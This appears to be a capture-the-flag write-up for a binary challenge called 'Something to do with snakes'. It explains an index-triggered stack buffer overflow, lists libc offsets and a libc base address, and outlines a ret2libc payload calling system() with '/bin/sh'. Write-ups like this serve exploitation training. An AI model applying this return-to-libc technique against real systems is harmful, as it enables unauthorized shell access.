# Something to do with snakes:

## Protections:
* ASLR

## Binary notes:
* The program asks for an index as well as an input string.

## Exploit notes:
* An index of 51 causes the binary to copy up to 0x46 bytes to a destination
buffer lower in the stack that is only 0x20 bytes. As a result we have a buffer
overflow and we can overwrite the return address.

#### Libc:
* Add the given libc library into the libc database.
* Dump useful offsets with ./dump:
```c
    $ ./dump local-c1d3aa79808e71885c67b9763b5e52a96cc02d16
        offset___libc_start_main_ret = 0x18637
        offset_system = 0x0003a940
        offset_dup2 = 0x000d4b50
        offset_read = 0x000d4350
        offset_write = 0x000d43c0
        offset_str_bin_sh = 0x15902b
```
* Using the maps file, we can get the base address of libc which is 0xf7e19000.

## Writing the exploit:
* The final exploit looks like:
"51 " + ["a" * 48 + system() + "b" * 4 + addr of "/bin/sh"]

## Scripts used:
* See exploit.py
